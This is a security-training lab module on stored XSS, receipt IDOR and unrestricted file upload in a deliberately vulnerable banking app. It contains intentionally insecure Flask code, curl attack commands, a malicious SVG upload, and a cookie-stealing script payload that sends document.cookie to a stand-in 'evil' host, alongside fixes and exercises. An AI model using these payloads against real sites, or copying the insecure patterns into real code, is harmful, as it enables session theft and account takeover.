# Module 10: Stored XSS & Unrestricted File Upload

## Understanding the Attacks

### Cross-Site Scripting (XSS)

XSS occurs when user-controlled data is placed into a page **without proper
output encoding**, so the browser parses attacker text as executable HTML/JS.
*Stored* XSS is the most dangerous variant: the payload is saved server-side and
runs in every victim who later views it.

```
attacker stores  <script>…</script>  ──▶  server renders it verbatim into HTML
victim opens the page                 ──▶  script runs in the victim's session
```

Because DVBank keeps its auth token where script can read it (a non-HttpOnly
cookie and `localStorage`), an XSS payload can exfiltrate the session and fully
take over the account.

### Unrestricted File Upload

If an upload endpoint accepts arbitrary file types, keeps the attacker's
filename, and serves the file back from the application's own origin, then an
uploaded `.svg`/`.html` containing script becomes **stored XSS**, and dangerous
filenames (`../`) enable **path traversal**. In server-side-execution stacks the
same flaw yields a web shell (RCE).

## Overview

In the React UI, transaction descriptions and profile fields are rendered as
text, so React auto-escapes them. The lab adds two server-side sinks that do
*not* escape: an HTML **receipt page** and a **file-serving** route, turning
stored data into executable script. (The React `AdminPanel` component has its own
separate *client-side* XSS via `dangerouslySetInnerHTML` — out of scope here.)

## Vulnerable Endpoints

### 1. Stored XSS in the transaction receipt (+ IDOR)
**Location**: `backend/routes/transaction_routes.py`
(`/api/transactions/<id>/receipt`)
```python
@transaction_bp.route('/api/transactions/<int:transaction_id>/receipt', methods=['GET'])
def transaction_receipt(transaction_id):          # no @token_required, no ownership check
    transaction = Transaction.query.get(transaction_id)
    ...
    html = f"""... <p><b>Memo:</b> {transaction.description or ''}</p> ..."""  # unescaped
    return html
```
The memo is set by the sender during `/api/transfer`. There is also **no
authentication and no ownership check**, so any receipt id is viewable by anyone
(IDOR / broken access control).

> 💡 **Hints for the Challenge**: the memo column is declared `String(200)`
> (SQLite doesn't actually enforce the length, but keep payloads compact). A
> compact exfil payload is `<script>new Image().src='//evil/?c='+document.cookie</script>`.

**Attack Vector**:
```bash
# store the payload (the endpoint parses request.get_json(), so the JSON
# Content-Type header is required or the body is ignored and nothing is stored)
curl -X POST .../api/transfer -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"to_user_id":2,"amount":1,"description":"<script>alert(document.cookie)</script>"}'
# trigger by opening (note: no auth needed, any id works)
#   http://localhost:5000/api/transactions/<id>/receipt
```

### 2. Unrestricted file upload → stored XSS / traversal
**Location**: `backend/routes/upload_routes.py`
```python
uploaded = request.files['file']
filename = uploaded.filename or 'upload.bin'   # raw client filename -> ../ traversal
dest = os.path.join(UPLOAD_DIR, filename)      # no extension/type/size check
uploaded.save(dest)
...
# served back inline with a guessed content-type from the same origin:
return Response(data, content_type=mimetypes.guess_type(full_path)[0] or 'application/octet-stream')
```

**Attack Vector** — `docs/exploits/README.md`:
```bash
printf '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>' > x.svg
curl -X POST .../api/upload-avatar -H "Authorization: Bearer $TOKEN" -F 'file=@x.svg'
# open the returned /uploads/x.svg -> the SVG's script executes on the app origin
```

## Impact Analysis
- Session/token theft → **full account takeover**. These sinks run on the API
  origin (port 5000), so the reachable secret is the same-origin **non-HttpOnly
  `session_token` cookie** (sufficient for takeover). The React app's
  `localStorage` token lives on the port-3000 origin and is *not* readable from
  these payloads — which is why the exfil hint uses `document.cookie`.
- Defacement, forced transfers, wormable payloads (every receipt viewer is hit).
- Upload traversal can overwrite files outside the upload directory.

## Detection Techniques
- Trace every place user input reaches an HTML/response sink; confirm it is
  contextually encoded.
- For uploads: check for extension/content-type allow-lists, `secure_filename`,
  size limits, and whether files are served `inline` from the app origin.

## Prevention Methods
- **Output-encode** for the HTML context (Jinja2 autoescaping, or escape the
  value); never build HTML by string interpolation of user data.
- Set a `Content-Security-Policy` to neuter inline script.
- Make the auth cookie `HttpOnly` so script cannot read it.
- Uploads: allow-list types, randomize the stored name with `secure_filename`,
  enforce size limits, store outside the web root, and serve with
  `Content-Disposition: attachment` and a fixed safe content-type.

## Exercises
1. Store an `alert(document.cookie)` memo and pop it via the receipt page. Then
   switch the receipt to a Jinja template with autoescaping and show it is inert.
2. Use the receipt IDOR to read a transaction you are not a party to; add an
   ownership check and confirm it now returns 403.
3. Upload an `.html` file and execute script from `/uploads/`. Add an extension
   allow-list + `secure_filename` and re-test.

## Additional Resources
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)

### Related Tools
- Burp Suite, OWASP ZAP, `dalfox` (XSS scanner)

### Industry Standards
- CWE-79 (XSS), CWE-434 (Unrestricted Upload), CWE-22 (Path Traversal),
  CWE-639 (IDOR)
